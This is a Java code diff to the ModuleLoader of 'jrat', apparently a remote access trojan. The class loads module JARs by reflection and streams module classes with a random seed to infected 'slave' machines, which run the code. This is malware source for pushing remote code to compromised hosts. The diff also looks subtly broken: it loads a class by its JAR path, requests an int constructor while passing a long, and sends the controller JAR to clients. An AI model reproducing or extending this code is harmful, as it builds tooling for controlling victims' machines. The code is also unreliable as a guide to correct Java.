@@ -2,7 +2,7 @@ package jrat.controller.modules;
 
 import jrat.common.Logger;
 import jrat.controller.AbstractSlave;
-import jrat.controller.api.ControllerModule;
+import jrat.api.Module;
 
 import java.io.ByteArrayOutputStream;
 import java.io.File;
@@ -13,6 +13,7 @@ import java.net.URL;
 import java.net.URLClassLoader;
 import java.util.ArrayList;
 import java.util.List;
+import java.util.Random;
 import java.util.jar.JarEntry;
 import java.util.jar.JarInputStream;
 
@@ -23,23 +24,25 @@ public class ModuleLoader {
      */
     private static class ModuleData {
 
-        public boolean controller;
-        public String path;
-        public String mainClass;
+        public String controllerPath;
+        public String clientPath;
+        public String controllerMain;
+        public String clientMain;
+        public long seed;
 
-        public ModuleData(boolean controller, String path, String mainClass) {
-            this.controller = controller;
-            this.path = path;
-            this.mainClass = mainClass;
+        public ModuleData(String controllerPath, String clientPath, String controllerMain, String clientMain) {
+            this.controllerPath = controllerPath;
+            this.clientPath = clientPath;
+            this.controllerMain = controllerMain;
+            this.clientMain = clientMain;
+            this.seed = new Random().nextLong();
         }
     }
 
-    private static final List<ModuleData> local = new ArrayList<ModuleData>();
     private static final List<ModuleData> modules = new ArrayList<ModuleData>();
 
     static {
-        local.add(new ModuleData(true, "registry-controller.jar", "jrat.module.registry.RegistryControllerModule"));
-        modules.add(new ModuleData(false, "registry-client.jar", "jrat.module.registry.RegistryClientModule"));
+        modules.add(new ModuleData( "registry-controller.jar", "registry-client.jar","jrat.module.registry.RegistryControllerModule", "jrat.module.registry.RegistryClientModule"));
     }
 
     /**
@@ -47,17 +50,17 @@ public class ModuleLoader {
      * @throws Exception
      */
     public static void load() throws Exception {
-        for (ModuleData mod : local) {
+        for (ModuleData mod : modules) {
             // add module JAR to classpath
             Method method = URLClassLoader.class.getDeclaredMethod("addURL", URL.class);
             method.setAccessible(true);
-            method.invoke(ClassLoader.getSystemClassLoader(), new File("modules", mod.path).toURI().toURL());
+            method.invoke(ClassLoader.getSystemClassLoader(), new File("modules", mod.controllerPath).toURI().toURL());
 
             // invoke init() on module
-            Class<ControllerModule> clazz = (Class<ControllerModule>) ModuleLoader.class.getClassLoader().loadClass(mod.mainClass);
-            Constructor<?> ctor = clazz.getDeclaredConstructor(null);
+            Class<Module> clazz = (Class<Module>) ModuleLoader.class.getClassLoader().loadClass(mod.controllerPath);
+            Constructor<?> ctor = clazz.getDeclaredConstructor(int.class);
             ctor.setAccessible(true);
-            ControllerModule module = (ControllerModule) ctor.newInstance(null);
+            Module module = (Module) ctor.newInstance(mod.seed);
             module.init();
         }
     }
@@ -72,11 +75,11 @@ public class ModuleLoader {
         slave.writeInt(modules.size());
 
         for (ModuleData mod : modules) {
-            slave.writeLine(mod.mainClass);
+            slave.writeLine(mod.clientMain);
 
             int total = 0;
 
-            JarInputStream jis = new JarInputStream(new FileInputStream(new File("modules", mod.path)));
+            JarInputStream jis = new JarInputStream(new FileInputStream(new File("modules", mod.controllerPath)));
             JarEntry entry;
             while ((entry = jis.getNextJarEntry()) != null) {
                 int size = (int) entry.getSize();
@@ -102,6 +105,7 @@ public class ModuleLoader {
 
                 slave.writeBoolean(true);
                 slave.writeLine(entry.getName());
+                slave.writeLong(mod.seed);
                 slave.writeInt(array.length);
                 slave.getDataOutputStream().write(array);
             }
@@ -109,7 +113,7 @@ public class ModuleLoader {
 
             // indicate that there are no entries left for this module
             slave.writeBoolean(false);
-            Logger.log("\twrote module '" + mod.mainClass + "' (" + total + " b)");
+            Logger.log("\twrote module '" + mod.clientMain + "' (" + total + " b)");
         }
     }
 }
